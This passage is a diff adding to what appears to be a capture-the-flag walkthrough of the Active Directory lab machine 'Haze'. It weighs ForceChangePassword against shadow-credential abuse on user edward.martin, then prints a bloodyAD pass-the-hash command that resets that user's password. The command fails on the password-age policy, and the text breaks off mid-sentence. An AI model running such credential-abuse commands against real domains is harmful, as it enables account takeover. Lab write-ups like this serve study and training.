@@ -497,4 +497,38 @@ So now ill re-collect bloodhound data, since i think there may be a member of su
 
 After re-collecting bloodhound data i see there is a user i can use. I have `ForceChangePassword` on `edward.martin` and also `AddKeyCredentialLink`
 
-So i have two options, i can either change the users password or i can abuse 
+So i have two options, i can either change the users password or i can abuse shadow credentials
+
+# Compromising `edward.martin`
+
+```python
+bloodyAD --host dc01.haze.htb -d haze.htb -u 'haze-it-backup$' -p ':76da32697ff38bc7c9fa6289abf47940' set password 'edward.martin' 'Password123!'
+Traceback (most recent call last):
+  File "/home/kali/.local/bin/bloodyAD", line 6, in <module>
+    sys.exit(main())
+             ~~~~^^
+  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py", line 342, in main
+    asyncio.run(amain())
+    ~~~~~~~~~~~^^^^^^^^^
+  File "/usr/lib/python3.13/asyncio/runners.py", line 195, in run
+    return runner.run(main)
+           ~~~~~~~~~~^^^^^^
+  File "/usr/lib/python3.13/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
+  File "/usr/lib/python3.13/asyncio/base_events.py", line 725, in run_until_complete
+    return future.result()
+           ~~~~~~~~~~~~~^^
+  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py", line 272, in amain
+    output = await result
+             ^^^^^^^^^^^^
+  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/set.py", line 288, in password
+    raise e
+  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/set.py", line 129, in password
+    await ldap.bloodymodify(target, {"unicodePwd": op_list})
+  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py", line 336, in bloodymodify
+    raise err
+badldap.commons.exceptions.LDAPModifyException: 
+Password can't be changed before -1 day, 7:55:46.122722 because of the minimum password age policy.
+```
+So i cannot abuse `ForceChangePassword` for some reason her
